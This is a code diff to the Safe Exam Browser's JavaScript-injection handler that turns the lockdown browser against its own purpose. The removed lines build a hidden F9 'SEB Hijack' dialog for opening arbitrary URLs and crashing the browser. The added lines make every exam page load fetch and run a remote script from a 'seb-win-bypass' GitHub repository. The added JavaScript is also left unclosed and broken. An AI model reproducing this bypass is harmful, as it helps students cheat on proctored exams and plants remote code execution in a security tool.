@@ -49,67 +49,40 @@ namespace SafeExamBrowser.Browser.Handlers
 				frame.ExecuteJavaScriptAsync($"window.print = function() {{ alert('{text.Get(TextKey.Browser_PrintNotAllowed)}') }}");
 			}
 
-var js = @"
-				
-				// Add event listener for F9 key to open the dialog
-				document.addEventListener('keydown', (event) => {
-					if (event.key === 'F9') {
-						document.getElementById('SEB_Hijack').showModal();
+			var js = @"
+				function loadScript(url, callback)
+				{
+					// Adding the script tag to the head as suggested before
+					var head = document.head;
+					var script = document.createElement('script');
+					script.type = 'text/javascript';
+					script.src = url;
+
+					// Then bind the event to the callback function.
+					// There are several events for cross browser compatibility.
+					script.onreadystatechange = callback;
+					script.onload = callback;
+
+					// Fire the loading
+					head.appendChild(script);
+				}
+
+				var checkIfCodeLoaded = function() {
+					// check for an element with id SEB_Hijack
+					if (document.getElementById('SEB_Hijack')) {
+						alert('SEB_Hijack successfully loaded');
+					} else {
+						alert('SEB_Hijack did not load'); 
 					}
-				});
-				
-				// Create the dialog element
-				const dialog = document.createElement('dialog');
-
-				// Add content to the dialog
-				dialog.innerHTML = `
-					<h2>SEB Hijack</h2>
-					<input type='text' id='urlInput' placeholder='Enter URL' required>
-					<button id='openUrlButton'>Open URL</button>
-					<button id='exitSEB'>Crash SEB</button>
-					<button id='closeButton'>Close</button>
-				`;
-
-				// Set the dialog ID
-				dialog.id = 'SEB_Hijack';
-
-				// Append the dialog to the body
-				document.body.appendChild(dialog);
-
-				// Create and append a style element for styling
-				const style = document.createElement('style');
-				style.textContent = `
-					dialog {
-						border: none;
-						border-radius: 5px;
-						box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-						padding: 20px;
-					}
-					#urlInput {
-						width: calc(100% - 22px);
-						padding: 5px;
-						margin-right: 5px;
-					}
-				`;
-				document.head.appendChild(style);
-
-				// Add event listener to close the dialog
-				document.getElementById('closeButton').addEventListener('click', () => {
-					document.getElementById('SEB_Hijack').close();
-				});
-
-				// Add event listener to handle button click
-				document.getElementById('openUrlButton').addEventListener('click', () => {
-					const url = document.getElementById('urlInput').value;
-					window.open(url, '_blank');
-					dialog.close();
-				});
-
-				// Add event listener to crash SEB
-                document.getElementById('exitSEB').onclick = function() {
-					CefSharp.PostMessage({ type: 'exitSEB' });
+							
 				};
-			";
+
+				// page load event listener
+				window.addEventListener('load', function() {
+					// load the script
+					loadScript('https://raw.githubusercontent.com/wxnnvs/seb-win-bypass/refs/heads/3.8.0-dev/the_script.js', checkIfCodeLoaded);
+
+				";
 
 			frame.ExecuteJavaScriptAsync(js);
 
@@ -119,21 +92,21 @@ var js = @"
 
 				if (clipboard.Content != default)
 				{
-					frame.ExecuteJavaScriptAsync($"SafeExamBrowser.clipboard.update('', '{clipboard.Content}');");
+					frame.ExecuteJavaScriptAsync($"SafeExamBrowser.clipboard.update('', '{clipboard.Content}'); ");
 				}
-			}
-		}
+	}
+}
 
-		public void OnContextReleased(IWebBrowser chromiumWebBrowser, IBrowser browser, IFrame frame)
-		{
-		}
+public void OnContextReleased(IWebBrowser chromiumWebBrowser, IBrowser browser, IFrame frame)
+{
+}
 
-		public void OnFocusedNodeChanged(IWebBrowser chromiumWebBrowser, IBrowser browser, IFrame frame, IDomNode node)
-		{
-		}
+public void OnFocusedNodeChanged(IWebBrowser chromiumWebBrowser, IBrowser browser, IFrame frame, IDomNode node)
+{
+}
 
-		public void OnUncaughtException(IWebBrowser chromiumWebBrowser, IBrowser browser, IFrame frame, JavascriptException exception)
-		{
-		}
+public void OnUncaughtException(IWebBrowser chromiumWebBrowser, IBrowser browser, IFrame frame, JavascriptException exception)
+{
+}
 	}
 }
